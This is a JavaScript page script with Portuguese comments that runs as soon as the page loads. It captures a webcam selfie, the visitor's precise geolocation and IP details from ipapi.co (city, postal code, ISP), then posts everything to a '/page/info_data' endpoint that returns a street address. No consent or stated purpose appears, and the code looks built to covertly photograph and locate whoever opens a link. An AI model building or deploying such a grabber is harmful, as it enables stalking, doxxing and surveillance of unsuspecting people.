document.addEventListener('DOMContentLoaded', () => {
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const selfieImg = document.getElementById('selfie');
    const resultDiv = document.getElementById('result');
    const resultData = document.getElementById('data_result');

    function captureSelfie() {
        return new Promise((resolve) => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    video.addEventListener('canplay', () => {
                        setTimeout(() => {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            stream.getTracks().forEach(track => track.stop());

                            const dataURL = canvas.toDataURL('image/png');
                            resolve(dataURL);
                        }, 1000);
                    });
                })
                .catch(err => {
                    console.error("Erro ao acessar a câmera:", err);
                    resolve("Sem imagem"); // Retornar "Sem imagem" em caso de erro
                });
        });
    }

    function getGeolocation() {
        return new Promise((resolve, reject) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    }),
                    error => {
                        let errorMsg;
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = "Usuário negou a solicitação de geolocalização.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = "Localização não disponível.";
                                break;
                            case error.TIMEOUT:
                                errorMsg = "Tempo limite de solicitação de geolocalização excedido.";
                                break;
                            case error.UNKNOWN_ERROR:
                                errorMsg = "Erro desconhecido na solicitação de geolocalização.";
                                break;
                        }
                        console.error(errorMsg);
                        reject(errorMsg);
                    }
                );
            } else {
                const errorMsg = "Geolocalização não suportada pelo navegador.";
                console.error(errorMsg);
                reject(errorMsg);
            }
        });
    }

    function getIpapiData() {
        return fetch(`https://ipapi.co/json/`)
            .then(response => response.json())
            .then(data_ipapi => {
                if (data_ipapi.error) {
                    console.error(data_ipapi.error);
                    throw new Error(data_ipapi.error);
                } else {
                    console.log('IPAPI Data:', data_ipapi);
                    return data_ipapi;
                }
            })
            .catch(error => {
                console.error('Erro:', error);
                throw error;
            });
    }

    async function sendData() {
        try {
            const [selfie, geolocation, ipapiData] = await Promise.all([
                captureSelfie(),
                getGeolocation(),
                getIpapiData()
            ]);

            const payload = {
                latitude: geolocation.latitude,
                longitude: geolocation.longitude,
                selfie: selfie || "Sem imagem", // Garantir que seja "Sem imagem" caso captureSelfie falhe
                ip_data: {
                    ip: ipapiData.ip,
                    city: ipapiData.city,
                    region_code: ipapiData.region_code,
                    postal: ipapiData.postal,
                    latitude: ipapiData.latitude,
                    longitude: ipapiData.longitude,
                    org: ipapiData.org
                }
            };

            fetch('/page/info_data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
                .then(response => response.json())
                .then(data => {
                    if (data.error) {
                        console.error(data.error);
                    } else {
                        console.log('Endereço:', data.address);
                    }
                })
                .catch(error => {
                    console.error('Erro ao obter o endereço:', error);
                });

        } catch (error) {
            console.error('Erro ao processar dados:', error);
        }
    }

    sendData();
});